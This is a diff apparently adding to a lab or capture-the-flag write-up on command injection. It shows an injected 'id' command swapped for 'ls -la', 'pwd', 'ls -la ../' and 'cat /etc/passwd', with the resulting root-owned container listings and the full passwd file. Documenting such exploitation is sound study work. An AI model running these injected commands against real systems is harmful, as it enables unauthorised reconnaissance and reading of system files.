@@ -958,3 +958,65 @@ Modifying the `id` command to be `ip a`, we get the following:
     inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
        valid_lft forever preferred_lft forever
 ```
+Modifying the `id` command to be `ls -la`, we get the following:
+```
+drwxr-xr-x 1 root root 4096 Nov  5  2021 .
+drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
+-rw-r--r-- 1 root root  122 Nov  3  2021 Dockerfile
+drwxr-xr-x 1 root root 4096 Nov  3  2021 project
+-rw-r--r-- 1 root root  208 Nov  3  2021 requirements.txt
+```
+
+Modifying the `id` command to be `pwd`, we get the following:
+```
+/backend
+```
+Modifying the `id` command to be `ls -la ../`, we get the following:
+```
+                                total 88
+drwxr-xr-x   1 root root 4096 Nov  5  2021 .
+drwxr-xr-x   1 root root 4096 Nov  5  2021 ..
+-rwxr-xr-x   1 root root    0 Nov  5  2021 .dockerenv
+drwxr-xr-x   1 root root 4096 Nov  5  2021 backend
+drwxr-xr-x   1 root root 4096 Nov  5  2021 bin
+drwxr-xr-x   2 root root 4096 Oct 20  2018 boot
+drwxr-xr-x   5 root root  340 Dec 28 17:02 dev
+drwxr-xr-x   1 root root 4096 Nov  5  2021 etc
+drwxr-xr-x   1 root root 4096 Nov  5  2021 home
+drwxr-xr-x   1 root root 4096 Nov 16  2018 lib
+drwxr-xr-x   2 root root 4096 Nov 12  2018 lib64
+drwxr-xr-x   2 root root 4096 Nov 12  2018 media
+drwxr-xr-x   2 root root 4096 Nov 12  2018 mnt
+drwxr-xr-x   2 root root 4096 Nov 12  2018 opt
+dr-xr-xr-x 173 root root    0 Dec 28 17:02 proc
+drwx------   1 root root 4096 Nov  5  2021 root
+drwxr-xr-x   3 root root 4096 Nov 12  2018 run
+drwxr-xr-x   1 root root 4096 Nov  5  2021 sbin
+drwxr-xr-x   2 root root 4096 Nov 12  2018 srv
+dr-xr-xr-x  13 root root    0 Dec 28 17:02 sys
+drwxrwxrwt   1 root root 4096 Nov  5  2021 tmp
+drwxr-xr-x   1 root root 4096 Nov 12  2018 usr
+drwxr-xr-x   1 root root 4096 Nov 12  2018 var
+```
+Modifying the `id` command to be `cat /etc/passwd`, we get the following:
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+```
